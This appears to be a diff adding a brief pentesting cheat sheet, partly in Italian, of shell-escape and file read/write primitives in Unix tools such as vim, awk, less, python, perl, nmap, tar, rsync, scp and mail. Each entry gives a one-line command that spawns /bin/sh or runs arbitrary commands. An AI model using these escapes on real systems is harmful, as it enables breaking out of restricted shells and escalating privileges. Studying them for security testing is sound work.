@@ -1,0 +1,43 @@
+Common commands with useful primitives
+
+- vim 						:: Execution primitive
+    :set shell=/bin/bash 
+    :shell
+      oppure
+    :!bash
+
+- awk 'BEGIN {system("/bin/sh")}' 		::Execution primitive
+
+- more, less, man 				:: Execution primitive
+    '! /bin/sh' or
+    '!/bin/sh'  or
+    '!bash'
+
+- irb 						:: Execution primitive
+    exec "/bin/sh"
+
+- python -c 'import pty; pty.spawn("/bin/sh")' 	:: Execution primitive
+
+- perl -e 'exec "/bin/sh";'			:: Execution primitive
+
+
+- echo "evil script code" | tee script.sh 	::File write primitive
+
+
+
+
+//Da verificare
+
+- From within nmap:  ::Execution primitive
+  !sh
+
+- arp -f <file> :: File read primitive
+
+- tar --checkpoint-action=<cmd> :: Execution primitive
+- rsync -e <cmd> :: Execution primitive
+- scp -F <file> a b: :: File read primitive
+- scp -S <command> a b: :: Execution primitive
+- lynx 'e' :: File read/write in editor
+- lynx ! :: Execute Primitive
+- mail "~v" :: Execute primitive
+
